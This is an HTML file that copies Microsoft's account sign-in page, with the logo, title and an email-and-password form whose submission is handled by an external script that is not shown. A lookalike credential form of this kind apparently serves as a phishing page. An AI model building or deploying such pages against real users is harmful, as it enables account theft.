<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="login-container">
            <div class="login-card">
                <div class="microsoft-logo">
                    <svg width="108" height="23" viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="10" height="10" fill="#F25022"/>
                        <rect x="12" width="10" height="10" fill="#7FBA00"/>
                        <rect y="12" width="10" height="10" fill="#00A4EF"/>
                        <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
                        <text x="30" y="16" font-family="Segoe UI" font-size="16" font-weight="600" fill="#323130">Microsoft</text>
                    </svg>
                </div>

                <div class="login-header">
                    <h1 class="login-title">Sign in</h1>
                </div>

                <form class="login-form" id="loginForm">
                    <div class="input-group">
                        <input type="email" id="email" name="email" class="input-field" placeholder="Email, phone, or Skype" required>
                        <div class="input-error" id="emailError"></div>
                    </div>

                    <div class="input-group">
                        <input type="password" id="password" name="password" class="input-field password-field" placeholder="Password" required>
                        <div class="input-error" id="passwordError"></div>
                    </div>

                    <div class="form-actions">
                        <button type="submit" class="next-button" id="nextButton">Sign in</button>
                    </div>
                </form>

                <div class="login-footer">
                    <div class="signup-link">
                        <a href="#" class="link">No account? Create one!</a>
                    </div>
                    <div class="help-links">
                        <a href="#" class="link">Can't access your account?</a>
                    </div>
                </div>
            </div>

            <div class="signin-options">
                <div class="signin-options-content">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6z" fill="#605E5C"/>
                        <path d="M8 4c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm0 6c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z" fill="#605E5C"/>
                    </svg>
                    <span>Sign-in options</span>
                </div>
            </div>

            <div class="footer">
                <div class="footer-links">
                    <a href="#" class="footer-link">Terms of use</a>
                    <a href="#" class="footer-link">Privacy & cookies</a>
                    <a href="#" class="footer-link">...</a>
                </div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
